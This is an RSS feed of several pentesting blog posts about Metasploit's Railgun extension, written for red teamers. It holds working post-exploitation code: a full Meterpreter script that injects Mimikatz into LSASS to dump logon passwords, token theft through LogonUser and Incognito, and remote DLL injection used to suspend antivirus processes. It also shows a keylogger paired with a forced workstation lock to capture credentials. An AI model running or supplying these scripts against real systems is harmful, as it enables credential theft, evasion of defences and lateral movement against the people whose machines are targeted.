<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Railgun on Room362</title>
    <link>http://localhost:1313/tags/railgun/</link>
    <description>Recent content in Railgun on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Tue, 31 Jul 2012 20:20:15 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/railgun/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Raising Zombies in Windows: Part 1 - Passwords</title>
      <link>http://localhost:1313/post/2012/2012731raising-zombies-in-windows-part-1-passwords-html/</link>
      <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/2012731raising-zombies-in-windows-part-1-passwords-html/</guid>
      <description>&lt;p&gt;With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.&lt;/p&gt;

&lt;p&gt;A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-3120at204-04-4120pm.png.41%20PM.png&#34; alt=&#34;Screen Shot 2012 07 31 at 4 04 41 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you&amp;rsquo;re generally SOL.&lt;/p&gt;

&lt;p&gt;There are a ton of posted ways around this, most involve make a wrapper script to input the password for you such as this one:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-3120at203-24-1120pm.png.11%20PM.png&#34; alt=&#34;Screen Shot 2012 07 31 at 3 24 11 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(this was pretty unique as it actually sent the keys to the key buffer instead of directly to STDIN)&lt;/p&gt;

&lt;p&gt;Another way if you don&amp;rsquo;t mind dropping / creating a custom bin, AutoIT makes this REALLY simple:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-3120at203-57-4220pm.png.42%20PM.png&#34; alt=&#34;Screen Shot 2012 07 31 at 3 57 42 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&amp;rsquo;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&amp;rsquo;ve built the AutoIT script into a EXE.&lt;/p&gt;

&lt;p&gt;But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following:&lt;/p&gt;

&lt;p&gt;a = client.railgun.kernel32.GetStartupInfoW(56)[&amp;ldquo;lpStartupInfo&amp;rdquo;]&lt;/p&gt;

&lt;p&gt;client.railgun.advapi32.CreateProcessWithLogonW(&amp;ldquo;USER&amp;rdquo;,&amp;ldquo;DOMAIN&amp;rdquo;,&amp;ldquo;PASSWORD&amp;rdquo;,&amp;ldquo;LOGON_WITH_PROFILE&amp;rdquo;,&amp;ldquo;notepad.exe&amp;rdquo;,nil,0,nil,nil,a,32)&lt;/p&gt;

&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;

&lt;p&gt;client.railgun.advapi32.LogonUserA(&amp;ldquo;USER&amp;rdquo;,&amp;ldquo;DOMAIN&amp;rdquo;,&amp;ldquo;PASSWORD&amp;rdquo;,&amp;ldquo;LOGON32_LOGON_INTERACTIVE&amp;rdquo;,&amp;ldquo;LOGON32_PROVIDER_DEFAULT&amp;rdquo;,4)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Integration of Mimikatz into Metasploit Stage1</title>
      <link>http://localhost:1313/post/2012/2012615integration-of-mimikatz-into-metasploit-stage1-html/</link>
      <pubDate>Fri, 15 Jun 2012 14:55:55 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/2012615integration-of-mimikatz-into-metasploit-stage1-html/</guid>
      <description>&lt;p&gt;One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.&lt;/p&gt;

&lt;p&gt;Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&amp;rsquo;ll get there in the subsequent posts.&lt;/p&gt;

&lt;p&gt;Ignore the do_cmd for now and I stepped through &lt;a href=&#34;http://localhost:1313/blog/2011/5/30/remote-dll-injection-with-meterpreter.html&#34;&gt;remote DLL injection here&lt;/a&gt;. So the first odd lines is &lt;/p&gt;

&lt;p&gt;handle = client.railgun.kernel32.CreateNamedPipeW(&amp;rsquo;\.\pipe\kiwi\mimikatz&amp;rsquo;, &amp;lsquo;PIPE_ACCESS_DUPLEX&amp;rsquo;, &amp;lsquo;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&amp;rsquo;, 1, 0, 0, 30000,nil)[&amp;lsquo;return&amp;rsquo;]&lt;/p&gt;

&lt;p&gt;connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Essentially these connect to the &lt;a href=&#34;http://en.wikipedia.org/wiki/Named_pipe&#34;&gt;Named Pipe&lt;/a&gt; that the sekurlsa.dll uses to talk to the mimikatz.exe in it&amp;rsquo;s normal operation. Then we just use the windows API call &amp;ldquo;ReadFile&amp;rdquo; from there on out.&lt;/p&gt;

&lt;p&gt;client.railgun.kernel32.ReadFile(handle,248,248,4,nil)&lt;/p&gt;

&lt;p&gt;One of the draw backs to doing this all remotely is that Railgun doesn&amp;rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&amp;rsquo;ve overcome this for the initial &amp;ldquo;banner&amp;rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &amp;ldquo;ping&amp;rdquo; and &amp;ldquo;getLogonPasswords&amp;rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)&lt;/p&gt;

&lt;p&gt;If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!&lt;/p&gt;

&lt;p&gt;Meterpreter Script:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def do_cmd(handle,cmd)
    ucommand = Rex::Text.to_unicode(cmd)
    sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
    good2go = false
    newline = false
    readstring = []
    while good2go == false
        # Have to pull data 1 unicode character at a time
        # this is because the pipe won&#39;t write or read if
        # too much was written or read by the &amp;quot;client&amp;quot; (us)
        pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
        # Check to see if our end of read check is there: n000 @00
        if pull[&#39;lpBuffer&#39;] == &amp;quot;@00&amp;quot; and newline == true
            good2go = true
        else
            readstring &amp;lt;&amp;lt; pull[&#39;lpBuffer&#39;]
        end

        # Ready the newline var for previous check on next loop
        if pull[&#39;lpBuffer&#39;] == &amp;quot;n00&amp;quot;
            newline = true
        else
            newline = false
        end
    end

    print_status(readstring.join(&amp;quot;&amp;quot;))
end

print_status(&amp;quot;x86 Detected - Using x86 mimikatz&amp;quot;)
handle = client.railgun.kernel32.CreateNamedPipeW(&#39;\\.\pipe\kiwi\mimikatz&#39;, &#39;PIPE_ACCESS_DUPLEX&#39;, &#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;, 1, 0, 0, 30000,nil)[&#39;return&#39;]
print_status(&amp;quot;Handle: #{handle}&amp;quot;)
framework.threads.spawn(&#39;injectlsass&#39;,false) {
    pid = client.sys.process[&#39;lsass.exe&#39;]
    print_status(&amp;quot;LSASS located at PID: #{pid}&amp;quot;)
    pathtomimi = &amp;quot;C:\sekurlsa.dll&amp;quot;

    pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
    pay.datastore[&amp;quot;DLL&amp;quot;] = pathtomimi
    pay.datastore[&amp;quot;EXITFUNC&amp;quot;] = &#39;thread&#39;

    raw = pay.generate
    targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = targetprocess.memory.allocate(raw.length + (30024))
    targetprocess.memory.write(mem, raw)
    sleep(2)
    targetprocess.thread.create(mem, 0)
    print_status(&amp;quot;Successfully Injected into LSASS&amp;quot;)
}
print_status(&amp;quot;Waiting for LSASS injection to complete&amp;quot;)
connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
print_status(&amp;quot;Mimikatz has called home, ready for command&amp;quot;)
sleep(2)
print_status(&amp;quot;Reading banner&amp;quot;)
client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
print_status(&amp;quot;Doing a quick ping to make sure things are working...&amp;quot;)
do_cmd(handle,&#39;ping&#39;)
print_status(&amp;quot;If you made it this far it worked, doing getLogonPasswords&amp;quot;)
do_cmd(handle, &#39;getLogonPasswords&#39;)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Remote DLL Injection with Meterpreter</title>
      <link>http://localhost:1313/post/2011/2011530remote-dll-injection-with-meterpreter-html/</link>
      <pubDate>Mon, 30 May 2011 16:35:40 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2011/2011530remote-dll-injection-with-meterpreter-html/</guid>
      <description>&lt;p&gt;Recently Didier Stevens wrote &amp;lsquo;Suspender.dll&amp;rsquo; which is a DLL that will suspend a process and all of it&amp;rsquo;s child processes after a delay. 60 seconds is it&amp;rsquo;s default but you can rename the DLL to add a number (as such &amp;lsquo;Suspender10.dll&amp;rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: &lt;a href=&#34;http://blog.didierstevens.com/2011/04/27/suspender-dll/&#34;&gt;http://blog.didierstevens.com/2011/04/27/suspender-dll/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Jonathan Cran and I had the same idea, as I&amp;rsquo;m sure many others did as well. This might work against AntiVirus setups that protect themselves from being killed or their services stopped.&lt;/p&gt;

&lt;p&gt;I still stand by my original claim that just removing it is easier (&lt;a href=&#34;http://localhost:1313/blog/2010/11/16/silently-uninstall-sep.html&#34;&gt;Blog Post: Silently Uninstall SEP&lt;/a&gt;). However that might be something the user notices (A little shield disappearing).&lt;/p&gt;

&lt;p&gt;Well, I didn&amp;rsquo;t know how to do this with meterpreter so a bit of google fu landed me on: &lt;a href=&#34;http://www.codeproject.com/KB/threads/winspy.aspx&#34;&gt;http://www.codeproject.com/KB/threads/winspy.aspx&lt;/a&gt; which has 3 different ways to attack the 2nd of which used a DLL (score!)&lt;/p&gt;

&lt;p&gt;Using IRB within a meterpreter shell I started using Railgun (because once you know something sometimes its easy not too look for other solutions)&lt;/p&gt;

&lt;p&gt;I start off setting up some variables after I&amp;rsquo;ve uploaded Suspender.dll:&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;pid = 1436
sizeofsuspend = 52376
pathtosuspend = &amp;quot;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Next up we need to open a handle on the target process:&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;handle = client.railgun.kernel32.OpenProcess(PROCESS_ALL_ACCESS,false,pid)[&amp;quot;return&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the handle we allocate some memory in the remote process for our DLL to live in:&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;allocatedmem = client.railgun.kernel32.VirtualAllocEx(handle,nil,sizeofsuspend,MEM_COMMIT,PAGE_READWRITE)[&amp;quot;return&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Writing that DLL to memory isn&amp;rsquo;t much harder: (&lt;em&gt;&lt;strong&gt;this and the previous step is the wrong way to do things as we&amp;rsquo;ll see later&lt;/strong&gt;&lt;/em&gt;)&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;client.railgun.kernel32.WriteProcessMemory(handle,allocatedmem,pathtosuspend,sizeofsuspend,nil)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here is the hard part. We have to somehow figure out the address LoadLibraryA in the remote processes memory space, accounting for ASLR then pass it the location in memory where our DLL is hiding. Yah, I couldn&amp;rsquo;t figure this one out, here is the best I did:&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;client.railgun.kernel32.CreateRemoteThread(handle,nil,0,allocatedmem,pathtosuspend,0,nil)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Then I got a friendly reminder by HD that most of this was built into meterpreter already so all that railgun nastness boils down to someting a lot simpler. Set the variables again:&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;pid = 1436
pathtosuspend = &amp;quot;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;But this time we are going to use the loadlibrary payload that just got added to Metasploit Framework in &lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12765&#34;&gt;r12765&lt;/a&gt;. We generate the payload with it pointing at our Suspender DLL:&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
pay.datastore[&#39;DLL&#39;] = pathtosuspend
pay.datastore[&#39;EXITFUNC&#39;] = &#39;thread&#39;
raw = pay.generate
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Open the process, this time with Rex:&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Allocate the memory in the remote process write the payload (not our DLL) into that space:&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
targetprocess.memory.write(mem, raw)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;And finally create the remote thread.. MUCH easier (The power of Rex even over Railgun)&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;targetprocess.thread.create(mem, 0)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;And 10 seconds later our AV and all it&amp;rsquo;s children processes stop. Suspended by Didier&amp;rsquo;s Suspender.DLL. Thanks to HD for the slap in the head that I was doing things the wrong way and the 1 AM update to the framework that made this possible.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Am I an Admin? Railgun Script</title>
      <link>http://localhost:1313/post/2010/2010913am-i-an-admin-railgun-script-html/</link>
      <pubDate>Mon, 13 Sep 2010 17:45:31 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2010/2010913am-i-an-admin-railgun-script-html/</guid>
      <description>&lt;p&gt;When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&amp;rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &amp;ldquo;Adminitrators&amp;rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &amp;lsquo;getsystem&amp;rsquo; and if one works other than Kitrap0d. You could also just do a &amp;lsquo;ps&amp;rsquo; and notice that you can see &amp;lsquo;SYSTEM&amp;rsquo; processes.&lt;/p&gt;

&lt;p&gt;But, I wanted to make a way that check a bunch of sessions all at once. So I wrote &amp;ldquo;AmIAdmin.rb&amp;rdquo; which uses meterpreter&amp;rsquo;s railgun extension to execute &amp;ldquo;IsUserAdmin&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Being that Shell32.dll isn&amp;rsquo;t included in railgun by default we have to add it. After writing it I decided to add some checks. These checks make sure that each piece of the script isn&amp;rsquo;t already loaded. It&amp;rsquo;s a good reference for doing this in the future.&lt;/p&gt;

&lt;p&gt;(you can remove the print_status lines if you want the script to be quieter)&lt;/p&gt;

&lt;p&gt;Here is the script for your consumption:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;if client.platform == &amp;ldquo;x64/win32&amp;rdquo;&lt;br /&gt;
print_status &amp;ldquo;Railgun is currently not supported for x64 bit systems&amp;rdquo;&lt;br /&gt;
raise Rex::Script::Completed&lt;br /&gt;
end&lt;/p&gt;

&lt;p&gt;if client.railgun.present? == true&lt;br /&gt;
print_status &amp;ldquo;Railgun already loaded.. skipping&amp;rdquo;&lt;br /&gt;
else&lt;br /&gt;
print_status &amp;ldquo;Loading Railgun&amp;rdquo;&lt;br /&gt;
client.core.use(&amp;ldquo;railgun&amp;rdquo;)&lt;br /&gt;
end&lt;/p&gt;

&lt;p&gt;if client.railgun.dll[&amp;lsquo;shell32&amp;rsquo;] == nil&lt;br /&gt;
print_status &amp;ldquo;Adding Shell32.dll&amp;rdquo;&lt;br /&gt;
client.railgun.add_dll(&amp;lsquo;shell32&amp;rsquo;,&amp;lsquo;shell32&amp;rsquo;)&lt;br /&gt;
else&lt;br /&gt;
print_status &amp;ldquo;Shell32 already loaded.. skipping&amp;rdquo;&lt;br /&gt;
end&lt;/p&gt;

&lt;p&gt;if (client.railgun.shell32.functions[&amp;lsquo;IsUserAnAdmin&amp;rsquo;] == nil&lt;br /&gt;
print_status &amp;ldquo;Adding the IsUserAnAdmin function&amp;rdquo;&lt;br /&gt;
client.railgun.add_function(&amp;lsquo;shell32&amp;rsquo;, &amp;lsquo;IsUserAnAdmin&amp;rsquo;, &amp;lsquo;BOOL&amp;rsquo;, [])&lt;br /&gt;
else&lt;br /&gt;
print_status &amp;ldquo;IsUserAnAdmin already loaded.. skipping&amp;rdquo;&lt;br /&gt;
end&lt;/p&gt;

&lt;p&gt;print_status &amp;ldquo;Running the IsUserAnAdmin function&amp;rdquo;&lt;br /&gt;
status = client.railgun.shell32.IsUserAnAdmin()&lt;/p&gt;

&lt;p&gt;if status[&amp;ldquo;return&amp;rdquo;] == true then&lt;br /&gt;
print_status &amp;ldquo;You are an administrator&amp;rdquo;&lt;br /&gt;
else&lt;br /&gt;
print_error &amp;ldquo;You are not an administrator&amp;rdquo;&lt;br /&gt;
end&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>resources for railgun development</title>
      <link>http://localhost:1313/post/2010/201083resources-for-railgun-development-html/</link>
      <pubDate>Tue, 03 Aug 2010 14:19:52 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2010/201083resources-for-railgun-development-html/</guid>
      <description>&lt;p&gt;Metasploit&amp;rsquo;s Railgun is awesome, but getting things to work correctly can be a pain. Here are some of the resources that have helped me out:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://msdn.microsoft.com/en-us/library/ms681381(VS.85&#34;&gt;System Error Codes&lt;/a&gt;.aspx) - This is hands down the best resource you have, it will tell you what that stupid &amp;ldquo;5&amp;rdquo; or &amp;ldquo;1314&amp;rdquo; means in your return value. Keep this tab open to circumvent crazed bovine attacks.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.winprog.org/tutorial/&#34;&gt;theForger&amp;rsquo;s Win32 API Programming Tutorial&lt;/a&gt; - A really good place to start when you are getting to know the Windows API and the frustrations that come along with it. I highly recommend going through it first.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://msdn.microsoft.com/en-us/library/aa383749&#34;&gt;MS Windows API Reference&lt;/a&gt; - Gigantic, and not the easiest to navigate, but really good for knowing what calls were added with each version of Windows as well as a basic (alphabetic) list of calls. Good if you know where you are going.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://undocumented.ntinternals.net/&#34;&gt;The Undocumented Functions - Win NT/2k/XP/2k3&lt;/a&gt; - A really old link but has good references to undocumented functions that have helped circumvent some of the stupidity of other more complicated functions.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://source.winehq.org/WineAPI/&#34;&gt;WineAPI Documentation&lt;/a&gt; - A great resource of API calls that mimic the Microsoft ones (Undocumented and Documented).&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Hope this helps and I look forward to seeing what you come up with&amp;hellip;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Intro to RailGun: WIN API for Meterpreter</title>
      <link>http://localhost:1313/post/2010/201077intro-to-railgun-win-api-for-meterpreter-html/</link>
      <pubDate>Thu, 08 Jul 2010 02:10:34 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2010/201077intro-to-railgun-win-api-for-meterpreter-html/</guid>
      <description>

&lt;p&gt;Back on June 13th, &amp;ldquo;Patrick HVE&amp;rdquo; released RAILGUN:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&#34;&gt;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&#34;&gt;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;iphlpapi&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ws2_32&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;kernel32&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ntdll&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;user32&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;advapi32&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(You can find out exactly what functions are available by default in the api.rb file)&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s also very extensible, it doesn&amp;rsquo;t have a DLL or function you need? But you can read all about in the manual:&lt;/p&gt;

&lt;p&gt;./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf&lt;/p&gt;

&lt;p&gt;Here are two examples where this comes in very handy:&lt;/p&gt;

&lt;h2 id=&#34;list-drives:1be7096449894c4f067b69b2d2c6d183&#34;&gt;List Drives:&lt;/h2&gt;

&lt;p&gt;The problem that I&amp;rsquo;ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;net use - Shows you what Network drives are connected, but not physical ones&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;fsutil fsinfo drives - You must be an administrator to ride this train&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;fdisk /status - Only on OLD versions of DOS, not sure when this disappeared&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But railgun solves this problem with a really short script:&lt;/p&gt;

&lt;blockquote&gt;
&lt;h1 id=&#34;load-the-railgun-plugin-update-you-no-longer-need-this-step:1be7096449894c4f067b69b2d2c6d183&#34;&gt;Load the Railgun plugin  &lt;strong&gt;&lt;em&gt;Update: You no longer need this step&lt;/em&gt;&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;client.core.use(&amp;ldquo;railgun&amp;rdquo;)&lt;/p&gt;

&lt;h1 id=&#34;make-the-api-call-to-enum-drive-letters:1be7096449894c4f067b69b2d2c6d183&#34;&gt;Make the API call to enum drive letters&lt;/h1&gt;

&lt;p&gt;a = client.railgun.kernel32.GetLogicalDrives()[&amp;ldquo;return&amp;rdquo;]&lt;/p&gt;

&lt;h1 id=&#34;math-magic-to-convert-the-binary-to-letters:1be7096449894c4f067b69b2d2c6d183&#34;&gt;Math magic to convert the binary to letters&lt;/h1&gt;

&lt;p&gt;drives = []&lt;br /&gt;
letters = &amp;ldquo;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;rdquo;&lt;br /&gt;
(0..25).each do |i|&lt;br /&gt;
test = letters[i,1]&lt;br /&gt;
rem = a % (2**(i+1))&lt;br /&gt;
if rem &amp;gt; 0&lt;br /&gt;
drives &amp;lt;&amp;lt; test&lt;br /&gt;
a = a - rem&lt;br /&gt;
end&lt;br /&gt;
end&lt;br /&gt;
print_line(&amp;ldquo;Drives Available = #{drives.inspect}&amp;rdquo;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Output:&lt;br /&gt;
Drives Available = [&amp;ldquo;A&amp;rdquo;, &amp;ldquo;C&amp;rdquo;, &amp;ldquo;D&amp;rdquo;, &amp;ldquo;P&amp;rdquo;, &amp;ldquo;X&amp;rdquo;]&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Save this as a meterpreter script and it&amp;rsquo;ll print every logical drive attached to the system even as a limited user (that the user can see).&lt;/p&gt;

&lt;p&gt;Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drives…&lt;/p&gt;

&lt;h2 id=&#34;jedi-keylogging:1be7096449894c4f067b69b2d2c6d183&#34;&gt;JEDI KEYLOGGING:&lt;/h2&gt;

&lt;p&gt;One of the problems with keylogging is you never know when that person will log in, and if you&amp;rsquo;re using a client side, they have probably already logged in and you&amp;rsquo;re hoping they log into a portal or some other password protected site.&lt;/p&gt;

&lt;p&gt;Railgun to the rescue again:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;# Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon&lt;/strong&gt;&lt;br /&gt;
meterpreter &amp;gt; bgrun keylogrecorder -c 1 -t 15&lt;br /&gt;
[&lt;em&gt;] Executed Meterpreter with Job ID 0&lt;br /&gt;
meterpreter &amp;gt; [&lt;/em&gt;] winlogon.exe Process found, migrating into 640&lt;br /&gt;
[&lt;em&gt;] Migration Successful!!&lt;br /&gt;
[&lt;/em&gt;] Starting the keystroke sniffer&amp;hellip;&lt;br /&gt;
[&lt;em&gt;] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt&lt;br /&gt;
[&lt;/em&gt;] Recording&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;# Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.&lt;/strong&gt;
&amp;gt;
&amp;gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;meterpreter &amp;gt; irb&lt;br /&gt;
[&lt;em&gt;] Starting IRB shell&lt;br /&gt;
[&lt;/em&gt;] The &amp;lsquo;client&amp;rsquo; variable holds the meterpreter client&lt;/p&gt;

&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;client.core.use(&amp;ldquo;railgun&amp;rdquo;)&lt;br /&gt;
=&amp;gt; true&lt;br /&gt;
client.railgun.user32.LockWorkStation()&lt;br /&gt;
=&amp;gt; {&amp;ldquo;GetLastError&amp;rdquo;=&amp;gt;0, &amp;ldquo;return&amp;rdquo;=&amp;gt;true}&lt;br /&gt;
exit&lt;br /&gt;
meterpreter &amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;Set up &amp;ldquo;tail -f&amp;rdquo; going on the log file for the keylogger and then kill the keylogger when you&amp;rsquo;ve gotten what you came for.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;meterpreter &amp;gt; bglist&lt;br /&gt;
[&lt;em&gt;] Job 0: [&amp;ldquo;keylogrecorder&amp;rdquo;, &amp;ldquo;-c&amp;rdquo;, &amp;ldquo;1&amp;rdquo;, &amp;ldquo;-t&amp;rdquo;, &amp;ldquo;15&amp;rdquo;]&lt;br /&gt;
meterpreter &amp;gt; bgkill 0&lt;br /&gt;
[&lt;/em&gt;] Killing background job 0&amp;hellip;&lt;br /&gt;
meterpreter &amp;gt;&lt;/p&gt;
